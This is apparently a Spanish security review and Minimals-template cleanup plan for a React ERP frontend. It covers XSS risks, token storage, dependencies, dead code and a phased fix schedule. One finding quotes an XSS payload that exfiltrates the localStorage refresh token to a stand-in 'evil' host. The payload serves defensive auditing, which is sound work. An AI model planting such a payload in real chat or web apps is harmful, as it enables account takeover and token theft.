# react-front-erp: revisión de seguridad y plan de limpieza de la plantilla Minimals

Análisis estático del repo `react-front-erp` (rama `main`, 2 564 archivos en `src/`, 441 mil líneas). Sin ejecutar la app ni tocar la BD.

---

## 1. Seguridad del frontend

### Hallazgos (por prioridad)

| # | Sev. | Hallazgo | Dónde |
|---|---|---|---|
| 1 | **Crítica** | **XSS por mensajes de WhatsApp.** El texto entrante (lo escribe cualquier persona que escriba al número del negocio) se convierte a HTML con `formatWhatsAppText` **sin escapar** y se inserta con `dangerouslySetInnerHTML`. Un mensaje como `<img src=x onerror="fetch('//evil/?'+localStorage.jwt_refresh_token)">` se ejecuta en el navegador del agente. Como los tokens están en `localStorage`, es toma de cuenta completa. La regex de URLs también permite romper el atributo `href` con `"`. | `pages/whatsapp/utils/get-message.ts` (función), `pages/whatsapp/sections/chat-message-item.tsx:270`, `chat-message-media.tsx:81`, `pages/sistema/whatsapp/sections/preview-message.tsx:217` |
| 2 | Alta | **HTML externo sin sanear.** `producto.contenido_prod` se pinta como HTML (viene de descripciones de producto, incluidas las extraídas de sitios externos con `html-product/extract`). `Markdown` usa `rehype-raw` sin `rehype-sanitize`, y se usa con `markdown_bddoc`/`texto_es_bddoc` de documentos técnicos (texto externo/traducido por IA). | `pages/inventario/catalogos/catalogo-details.tsx:1673`, `components/markdown/markdown.tsx:65`, `sections/base-tecnica/documento-tecnico-dialog.tsx:398,471`, `components/editor/content-view.tsx:22` |
| 3 | Alta | **Tokens en `localStorage`** (`jwt_access_token` y `jwt_refresh_token`). Cualquier XSS los roba; el refresh dura 7 días. | `auth/context/jwt/utils.ts`, `lib/axios.ts` |
| 4 | Alta | **Secreto dentro del bundle.** `VITE_POS_PRINTER_TOKEN` se compila en el JS y lo ve cualquiera que abra la app; se manda como `X-Auth-Token` al agente de impresión. | `global-config.ts`, `hooks/use-pos-printer.ts`, `pages/inventario/etiquetas/etiquetas-print.tsx` |
| 5 | Media | **Sin cabeceras de seguridad ni CSP.** `vercel.json` solo tiene el rewrite. Sin CSP, el XSS del punto 1 no tiene ninguna segunda barrera. | `vercel.json` |
| 6 | Media | **Dependencia vulnerable:** `xlsx@0.18.5` (la versión de npm está abandonada; prototype pollution y ReDoS) y se usa para **leer** Excel subidos (`pages/tesoreria/utils/liquidacion-tarjeta.ts`). `@tiptap/core` también tiene un aviso de prototype pollution. `yarn audit`: 4 altas, 2 medias, 2 bajas. | `package.json` |
| 7 | Media | **`yarn.lock` está en `.gitignore`.** Builds no reproducibles, no se puede auditar en CI y cada `yarn install` puede traer versiones distintas. | `.gitignore:44` |
| 8 | Baja | `routes/paths.ts` importa `_mock/assets`, así que los datos falsos viajan en el bundle de producción. | `routes/paths.ts:3` |
| 9 | Baja | 55 `console.log`; los que imprimen `DATA` son de pantallas de demostración (se van con la limpieza). | varios |
| 10 | Baja | `window.open(adj.ruta_adco, '_blank')` abre una URL que viene de la BD; sin `noopener` explícito. | `sections/correos/view/correos-view.tsx:777` |

**Lo que está bien:** sin `eval`/`new Function`; `.env` fuera de git; el iframe de correos usa `sandbox` sin `allow-scripts`; `returnTo` no permite redirección abierta (se usa una constante); la autorización real vive en el backend (ya exige token en toda la API).

### Acciones de seguridad

1. **Ahora (1 día):** escapar HTML antes de dar formato en `formatWhatsAppText`, y validar que el `href` empiece con `http(s)://` y escapar las comillas. Es el arreglo más urgente.
2. **Esta semana:** añadir `dompurify` y un único helper `sanitizeHtml()` para `contenido_prod`, `EditorContentView` y cualquier `dangerouslySetInnerHTML`; `rehype-sanitize` en `Markdown` tras `rehype-raw`.
3. **Esta semana:** cabeceras en `vercel.json`: `Content-Security-Policy` (empezar en `Report-Only`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'` y HSTS.
4. **Esta semana:** quitar `VITE_POS_PRINTER_TOKEN` del front. Opciones: que el agente de impresión acepte solo el origen del ERP + LAN, o que la impresión pase por el backend con la sesión del usuario.
5. **Esta semana:** reemplazar `xlsx` por `exceljs`, o instalar SheetJS desde su CDN oficial (0.20.x); subir `@tiptap/*` a la última 2.x.
6. **Esta semana:** sacar `yarn.lock` del `.gitignore` y commitearlo; correr `yarn audit` en CI.
7. **Mediano plazo:** mover el refresh token a una cookie `httpOnly; Secure; SameSite=Strict` (requiere cambio en el backend) y dejar el access token solo en memoria.

---

## 2. Qué sobra de la plantilla Minimals

Método: grafo de imports de `src/` desde `main.tsx` (incluye `lazy(() => import())`), quitando del router las rutas de demostración y calculando qué queda inalcanzable. **Resultado: 911 archivos y ≈84 mil líneas (19 %) sobran.** La lista exacta está en `docs/front-candidatos-a-borrar.txt`.

### A) Plantilla pura (seguro de borrar, 870 archivos aprox.)

| Bloque | Qué es |
|---|---|
| `sections/_examples` (272) + `pages/components` (59) | Galería de componentes `/components/*` |
| `pages/auth-demo`, `auth/view/auth-demo` | Pantallas de login de ejemplo |
| Proveedores de auth **amplify, firebase, auth0, supabase** (`auth/context/*`, `auth/view/*`, `pages/auth/*`, `lib/firebase.ts`, `lib/supabase.ts`) | El ERP usa solo JWT. Hoy **se compilan los 4** porque `app.tsx` los importa todos |
| `pages/dashboard/{ecommerce,analytics,banking,booking,course,order,invoice,post,product,job,tour,mail,chat,calendar,kanban,params,blank,permission}` y `dashboard/user/{profile,cards,list,new,edit}` | Dashboards y módulos de ejemplo |
| `sections/{overview (61 de 67), product, chat, blog, kanban, user, invoice, job, tour, checkout, order, mail, calendar, payment, about, faqs, contact, pricing, address, …}` | Las vistas de esos ejemplos |
| `pages/{about-us, contact-us, faqs, pricing, payment, coming-soon, maintenance, post, product}` | Páginas de marketing |
| `components/{mega-menu, nav-basic, map, custom-data-grid, organizational-chart}` y `layouts/components/{account-popover, contacts-popover, nav-upgrade, workspaces-popover, notifications-drawer}` | Sin ninguna referencia en el ERP (el ERP usa `account-drawer` y su propio sistema de notificaciones) |
| `actions/*`, `types/{blog,calendar,invoice,job,kanban,order,product,tour,user}`, `_mock/*` | Datos y tipos falsos. Hoy `_mock` llega al bundle vía `routes/paths.ts` |

### B) Posibles huérfanos del ERP (≈40 archivos, **confirmar uno a uno**)

No son de la plantilla, pero nadie los importa: `pages/whatsapp/sections/chat-room*.tsx` (adaptados del chat de Minimals), `pages/inventario/comprobantes/sections/productos-{bajo,mayor}-stock-*`, `pages/importaciones/secciones/rentabilidad-*`, `core/components/form/Frm{Cliente,Producto}.tsx`, `api/modules/sistema/calendar.ts`, etc. Pueden ser trabajo en curso; están listados en la sección B del `.txt`.

### Dependencias

| Acción | Paquetes |
|---|---|
| **Quitar** (solo las usa código muerto o nadie) | `firebase`, `aws-amplify`, `@supabase/supabase-js`, `@auth0/auth0-react`, `@fullcalendar/{core,daygrid,interaction,list,react,timegrid,timeline}`, `@react-pdf/renderer`, `react-organizational-chart`, `embla-carousel-auto-height`, `embla-carousel-fade` |
| **Quitar al eliminar el selector de fuentes** de la plantilla | `@fontsource-variable/{dm-sans,inter,nunito-sans}` (el tema solo usa Public Sans y Barlow) |
| **No quitar aunque parezcan sin uso** | `apexcharts` (peer de `react-apexcharts`), `@emotion/styled` y `stylis` (peers de MUI), `@tiptap/core` y `@tiptap/pm` (peers de tiptap) |
| **Ojo con `@tiptap/starter-kit`** | Nadie lo importa, pero arrastra las extensiones que sí importa el código (`extension-bold`, `-heading`, …), hoy sin declarar en `package.json`. Antes de quitarlo, añadir esas extensiones de forma explícita |
| **Revisar después de la limpieza** | `mapbox-gl` + `react-map-gl` (solo los usan `cliente-direccion-frm.tsx` y un mensaje de WhatsApp), `react-phone-number-input`, `@mui/x-tree-view`, `framer-motion`, `react-color`, `emoji-picker-react`, los idiomas de `locales/langs` (ar, cn, fr, vi) |
| **Faltan en `package.json`** (funcionan por hoisting) | `@floating-ui/react` y las extensiones `@tiptap/extension-*` |

Con el `yarn.lock` commiteado, `yarn remove <paquete>` los quita limpiamente.

---

## 3. Plan de acción (orden recomendado)

**Fase 0: preparación (½ día)**
- Commitear `yarn.lock`; rama `chore/limpieza-minimals`.
- `yarn build` y anotar el tamaño del bundle como línea base.
- **Decisiones resueltas:**
  - **Menú.** Se genera desde `sis_opcion` (`tipo_opci` = ruta) y esas opciones salen de `layouts/nav-config-dashboard.tsx` (lo usa `pages/sistema/opciones/opcion-list.tsx` con `f_generar_opciones_proerp`). Evalué ese archivo: **209 rutas de menú y ninguna coincide con las rutas de demostración a borrar.** Falta solo confirmar la BD real (puede tener opciones antiguas que ya no estén en ese archivo):
    ```sql
    SELECT ide_opci, nom_opci, tipo_opci
    FROM sis_opcion
    WHERE ide_sist = 2
      AND tipo_opci ~ '^/(components|auth-demo|about-us|contact-us|faqs|pricing|payment|coming-soon|maintenance|post|product|dashboard/(ecommerce|analytics|banking|booking|course|order|invoice|post|product|job|tour|mail|chat|calendar|kanban|params|blank|permission|user/(profile|cards|list|new|edit)))(/|$)';
    ```
    Si devuelve filas, esas opciones hay que desactivarlas antes de borrar la ruta.
  - **File manager.** Fue modificado para el ERP (marca de agua, reutilizar archivo, vista por producto), así que **se conserva** junto con `dashboard/file` y `FileButton`. Sus 2 archivos sueltos sin uso (`file-manager-action-selected.tsx`, `file-manager-file-item-slots.tsx`) pasan a la sección B para revisarlos.
  - **Pendiente:** qué hacer con `/` (landing pública de marketing, ver sección 5).
  - **`sign-up` JWT:** el backend no tiene `auth/sign-up`, se borra.
- **Puntos de enganche** (código del ERP que enlaza a páginas que se borran; hay que limpiarlos en la misma fase): `auth/guard/auth-guard.tsx` (mapa de proveedores), `layouts/auth-centered|auth-split|simple/layout.tsx` (enlace `paths.faqs`; el split además referencia `firebase.signIn`), `layouts/main/footer.tsx` (`about`, `contact`), `layouts/main/nav/mobile/nav-mobile-list.tsx` (`paths.components`), `sections/checkout/context/checkout-provider.tsx`.

**Fase 1: seguridad urgente (1–2 días)** → puntos 1 a 4 y 6 de la sección 1. No depende de la limpieza y debe ir primero.

**Fase 2: rutas de demostración (1 día)**
- Quitar de `routes/sections/` `components.tsx`, `auth-demo.tsx`, y las entradas de demo en `main.tsx` y `dashboard.tsx` (las rutas de demostración ocupan unas 300 de sus 2 172 líneas; el resto es ERP).
- Borrar las páginas y secciones del bloque A. Compilar (`yarn tsc`) tras cada carpeta.

**Fase 3: proveedores de autenticación (½ día)**
- `app.tsx`: dejar solo `JwtAuthProvider`; `global-config.ts`: eliminar firebase/amplify/auth0/supabase; `auth-guard.tsx`, `sign-out-button.tsx` y `layouts/auth-split/layout.tsx`: quitar referencias a auth0.
- `yarn remove firebase aws-amplify @supabase/supabase-js @auth0/auth0-react`. Es la mayor mejora de bundle y de superficie de ataque.

**Fase 4: mocks y datos de ejemplo (½ día)**
- `routes/paths.ts`: quitar `MOCK_ID/MOCK_TITLE` y las URLs de la tienda de Minimals. Eliminar `src/_mock`, `public/assets/images/mock`, `actions/*`, `types/*` de demo.

**Fase 5: huérfanos del ERP (1 día, contigo)**
- Revisar la sección B del `.txt`: borrar lo que sea resto de la plantilla, conservar lo que sea trabajo en curso.

**Fase 6: dependencias (½ día)**
- `yarn remove` de la tabla; añadir explícitas las extensiones de tiptap antes de quitar `starter-kit`; decidir fuentes e idiomas.

**Fase 7: verificación (½ día)**
- `yarn tsc`, `yarn lint`, `yarn build`; comparar bundle con la línea base.
- Recorrido manual de los módulos del ERP (login, dashboard, ventas, inventario, tesorería, WhatsApp, notificaciones, reportes PDF).
- Desplegar primero a un entorno de pruebas.

**Reglas de seguridad para esta limpieza:** un commit por fase; `yarn tsc` verde antes de cada commit; no mezclar borrados con correcciones de seguridad; si una fase falla, se revierte solo esa.

---

## 4. Límites de este análisis

- El grafo no ve `import.meta.glob`, rutas armadas con strings ni recursos referenciados solo desde el menú dinámico de la BD.
- Las rutas marcadas como demo son una clasificación mía (por nombre y por uso de `_mock`); conviene confirmarla con el menú real.
- No ejecuté la aplicación ni el build completo; los números de bundle saldrán de la Fase 0.
- El grafo cuenta como import las líneas comentadas (`// import …`), así que el resultado es un mínimo: es posible que sobre algo más.

## 5. Decisión pendiente: la ruta `/`

Hoy `/` muestra `HomeView`: una **landing pública de marketing** dentro de `MainLayout` (cabecera y pie de página de marketing), visible para cualquiera sin iniciar sesión. Mezcla contenido adaptado a ProERP con restos de Minimals ("For designer", "A dark theme…", "Right-to-left", "Interface Starter Kit", "Minimal Design System"). Son 12 secciones en `sections/home`, más `layouts/main` y las páginas que enlaza (`about-us`, `contact-us`, `faqs`, `pricing`, `payment`).

- **Opción A: redirigir `/` a `/dashboard`.** Quien no tenga sesión cae en el login (lo hace `AuthGuard`). Es lo que la propia plantilla sugiere en un comentario de `routes/sections/index.tsx` (`<Navigate to={CONFIG.auth.redirectPath} />`). Borra el bloque de marketing completo.
- **Opción B: conservar la landing** como página comercial de ProERP. Habría que quitar los textos de Minimals y decidir si se mantiene `pricing`, `faqs`, `about-us` y `contact-us`.
- Si ya tienes el sitio comercial en otro lado (como `page-diquimec`), la opción A es la recomendable.
